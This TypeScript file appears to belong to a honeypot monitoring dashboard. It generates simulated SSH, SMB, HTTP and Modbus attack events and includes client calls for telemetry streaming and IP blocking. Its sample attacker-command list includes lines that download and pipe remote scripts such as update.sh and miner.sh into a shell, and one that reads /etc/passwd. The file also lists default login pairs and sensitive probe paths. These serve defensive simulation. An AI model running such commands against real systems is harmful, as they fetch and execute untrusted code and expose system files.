import { HoneypotEvent, ActiveBlocklistRule, HoneypotAnalytics } from '../types/honeypot';

// Static lists for realistic honeypot attack generation
export const ATTACK_IPS = [
  { ip: '185.156.177.34', country: 'Russia', code: 'RU' },
  { ip: '103.203.57.18', country: 'China', code: 'CN' },
  { ip: '45.143.203.111', country: 'Netherlands', code: 'NL' },
  { ip: '193.201.224.23', country: 'Ukraine', code: 'UA' },
  { ip: '82.102.23.149', country: 'Germany', code: 'DE' },
  { ip: '117.218.35.45', country: 'India', code: 'IN' },
  { ip: '198.51.100.72', country: 'United States', code: 'US' },
  { ip: '14.139.12.89', country: 'South Korea', code: 'KR' },
  { ip: '177.92.14.215', country: 'Brazil', code: 'BR' },
  { ip: '190.12.83.42', country: 'Colombia', code: 'CO' },
  { ip: '109.234.160.12', country: 'Turkey', code: 'TR' },
  { ip: '103.55.201.144', country: 'Vietnam', code: 'VN' }
];

export const COWRIE_CREDENTIALS = [
  { u: 'root', p: '123456' },
  { u: 'admin', p: 'admin' },
  { u: 'support', p: 'support' },
  { u: 'ubnt', p: 'ubnt' },
  { u: 'pi', p: 'raspberry' },
  { u: 'root', p: 'root' },
  { u: 'user', p: 'password' },
  { u: 'oracle', p: 'oracle' }
];

export const COWRIE_COMMANDS = [
  'wget http://91.203.45.12/update.sh -O- | sh',
  'curl -fsSL http://185.122.3.99/miner.sh | bash',
  'uname -a; lscpu; cat /proc/cpuinfo',
  'rm -rf /tmp/.t; mkdir /tmp/.t; cd /tmp/.t',
  'cat /etc/passwd',
  '/sbin/ifconfig -a',
  'apt-get install -y zsh',
  './jaws -port 8080 -ssl'
];

export const DIONAEA_EXPLOITS = [
  { method: 'MS17-010 EternalBlue', port: 445, payload: 'c2e8a1d7f64290356cbb015fa4d38c691307b22ee015a9e334bc6ad734fe0d12' },
  { method: 'CVE-2019-0708 BlueKeep', port: 3389, payload: 'e8311a2f6904d6021bb463fa7883fc23307b551ee601a9b234ca6ad734fe33cd' },
  { method: 'Memcached Amplification Probe', port: 11211, payload: 'f562b78a69d4d2045cc463fa5553fc23307b112ee601a9e334dc6ad734fe124a' },
  { method: 'FTP Rogue File Upload', port: 21, payload: 'a4d5e6f36934c2045ab463fa8883fc23307b115ee601a9b334bc6ad734fe99ef' },
  { method: 'SMB Null Session Enumerate', port: 445, payload: '82d5a1b3c94290356cbb015fa4d38c691307b22ee015a9e334bc6ad734fe8923' }
];

export const ELASTIC_PROBES = [
  { method: 'GET', path: '/wp-admin/setup-config.php', port: 80, name: 'WordPress Setup Fingerprint' },
  { method: 'POST', path: '/xmlrpc.php', port: 80, name: 'WordPress Brute Force XMLRPC' },
  { method: 'GET', path: '/.env', port: 443, name: 'Config Environment Information Disclosure' },
  { method: 'GET', path: '/actuator/env', port: 8080, name: 'Spring Boot Actuator Infiltration' },
  { method: 'GET', path: '/api/v1/status', port: 443, name: 'Rogue Endpoint Ingress Probe' },
  { method: 'GET', path: '/phpmyadmin/index.php', port: 80, name: 'Database Audit Entry Scan' }
];

export const CONPOT_SCADA = [
  { reg: 'Holding Register 40001', op: 'Read (0x03)', port: 502, msg: 'Modbus poll request targeting Generator Coil State' },
  { reg: 'Coil 10024', op: 'Write (0x05)', port: 502, msg: 'Modbus unauthorized write attempt targeting Flow Control Valve' },
  { reg: 'Input Status 30005', op: 'Read (0x02)', port: 502, msg: 'Modbus PLC telemetry enumeration scan' },
  { reg: 'Holding Register 40102', op: 'Preset Single Register (0x06)', port: 502, msg: 'SCADA Turbine speed control bypass attempt' }
];

// Helper to generate a highly realistic event
export function generateRandomEvent(): HoneypotEvent {
  const attacker = ATTACK_IPS[Math.floor(Math.random() * ATTACK_IPS.length)];
  const services: HoneypotEvent['service'][] = ['Cowrie', 'Dionaea', 'ElasticPot', 'Conpot'];
  const service = services[Math.floor(Math.random() * services.length)];
  const timestamp = new Date().toISOString();
  const id = `EV-${Math.floor(100000 + Math.random() * 900000)}`;

  let severity: HoneypotEvent['severity'] = 'INFO';
  let targetPort = 80;
  let message = '';
  let details: HoneypotEvent['details'] = {};

  if (service === 'Cowrie') {
    const isCommand = Math.random() > 0.5;
    targetPort = Math.random() > 0.2 ? 22 : 23;
    severity = isCommand ? 'HIGH' : 'MEDIUM';
    const cred = COWRIE_CREDENTIALS[Math.floor(Math.random() * COWRIE_CREDENTIALS.length)];
    if (isCommand) {
      const command = COWRIE_COMMANDS[Math.floor(Math.random() * COWRIE_COMMANDS.length)];
      message = `SSH session authenticated successfully for user "${cred.u}". Executing payload shell script.`;
      details = { username: cred.u, password: cred.p, command };
    } else {
      message = `Brute-force login attempt targeting TCP port ${targetPort} failed. Username: "${cred.u}", Password: "${cred.p}".`;
      details = { username: cred.u, password: cred.p };
    }
  } else if (service === 'Dionaea') {
    const exploit = DIONAEA_EXPLOITS[Math.floor(Math.random() * DIONAEA_EXPLOITS.length)];
    targetPort = exploit.port;
    severity = exploit.port === 445 || exploit.port === 3389 ? 'CRITICAL' : 'HIGH';
    message = `Vulnerability scanner matched signature: ${exploit.method}. Discarding uploaded payload hash.`;
    details = { exploitMethod: exploit.method, payloadHash: exploit.payload };
  } else if (service === 'ElasticPot') {
    const probe = ELASTIC_PROBES[Math.floor(Math.random() * ELASTIC_PROBES.length)];
    targetPort = probe.port;
    severity = probe.path.includes('.env') || probe.path.includes('actuator') ? 'HIGH' : 'MEDIUM';
    message = `Threat scan matched rule [${probe.name}]. Responding with decoy headers.`;
    details = { httpMethod: probe.method, httpPath: probe.path };
  } else {
    // Conpot
    const scada = CONPOT_SCADA[Math.floor(Math.random() * CONPOT_SCADA.length)];
    targetPort = scada.port;
    severity = scada.op.includes('Write') ? 'CRITICAL' : 'HIGH';
    message = `${scada.msg}. SCADA Sensor Registry simulation successful.`;
    details = { scadaRegister: scada.reg, scadaOperation: scada.op };
  }

  return {
    id,
    timestamp,
    service,
    severity,
    attackerIp: attacker.ip,
    attackerCountry: attacker.country,
    attackerCountryCode: attacker.code,
    targetPort,
    message,
    details
  };
}

// Client-side service hook for subscribing to honeypot telemetry stream
export class HoneypotStreamService {
  private eventListeners: ((event: HoneypotEvent) => void)[] = [];
  private eventSource: EventSource | null = null;
  private fallbackInterval: NodeJS.Timeout | null = null;

  public connect(onEvent: (event: HoneypotEvent) => void) {
    this.eventListeners.push(onEvent);

    // Try to open a real Server-Sent Events stream
    try {
      this.eventSource = new EventSource('/api/telemetry/stream');
      
      this.eventSource.onmessage = (e) => {
        try {
          const eventData = JSON.parse(e.data) as HoneypotEvent;
          this.triggerListeners(eventData);
        } catch (err) {
          console.error('Error parsing SSE telemetry payload:', err);
        }
      };

      this.eventSource.onerror = () => {
        console.warn('Real-time SSE disconnected. Enforcing automatic client-side fallback generation loop...');
        this.startFallbackLoop();
      };
    } catch (err) {
      console.error('Failed to establish EventSource connection:', err);
      this.startFallbackLoop();
    }
  }

  public disconnect() {
    this.eventListeners = [];
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
    if (this.fallbackInterval) {
      clearInterval(this.fallbackInterval);
      this.fallbackInterval = null;
    }
  }

  private triggerListeners(event: HoneypotEvent) {
    this.eventListeners.forEach(listener => listener(event));
  }

  private startFallbackLoop() {
    if (this.fallbackInterval) return;
    this.fallbackInterval = setInterval(() => {
      // Generate standard mock event periodically
      const event = generateRandomEvent();
      this.triggerListeners(event);
    }, Math.floor(Math.random() * 1500) + 1200); // 1.2 to 2.7s intervals
  }

  // Trigger manual IP block action
  public async blockIp(ip: string, reason: string): Promise<ActiveBlocklistRule[]> {
    try {
      const response = await fetch('/api/telemetry/block-ip', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ ip, reason })
      });
      if (response.ok) {
        return await response.json();
      }
    } catch (err) {
      console.warn('Block-IP backend call failed, performing mock local fallback:', err);
    }

    // Client-side fallback rule generation
    const fallbackRules: ActiveBlocklistRule[] = [
      {
        id: `FR-${Math.floor(1000 + Math.random() * 9000)}`,
        ip,
        bannedAt: new Date().toLocaleTimeString(),
        reason,
        duration: '24 Hours'
      }
    ];
    return fallbackRules;
  }

  // Fetch initial analytics metrics
  public async fetchAnalytics(): Promise<HoneypotAnalytics | null> {
    try {
      const response = await fetch('/api/telemetry/analytics');
      if (response.ok) {
        return await response.json();
      }
    } catch (err) {
      console.warn('Could not load analytics endpoint, using simulation stats.', err);
    }

    // Mock initial data in case fetch fails
    return {
      topTargetedPorts: [
        { name: 'Port 22 (SSH)', hits: 1242 },
        { name: 'Port 445 (SMB)', hits: 894 },
        { name: 'Port 80 (HTTP)', hits: 762 },
        { name: 'Port 502 (Modbus)', hits: 310 },
        { name: 'Port 3389 (RDP)', hits: 182 }
      ],
      attackerGeoStats: [
        { name: 'Russia', hits: 540 },
        { name: 'China', hits: 490 },
        { name: 'United States', hits: 310 },
        { name: 'Netherlands', hits: 240 },
        { name: 'Brazil', hits: 180 }
      ]
    };
  }
}
